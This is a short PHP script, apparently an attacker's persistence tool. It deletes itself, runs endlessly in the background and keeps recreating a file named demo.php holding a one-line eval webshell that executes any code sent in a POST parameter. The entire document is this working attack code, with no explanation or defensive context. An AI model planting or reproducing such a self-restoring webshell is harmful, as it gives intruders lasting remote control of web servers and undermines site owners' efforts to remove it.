<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = 'demo.php';
$shell = '<?php @eval($_POST[cmd]);?>';
 
while (TRUE) {
if (!file_exists($file)) {
file_put_contents($file, $shell);
}
usleep(50);
}
?>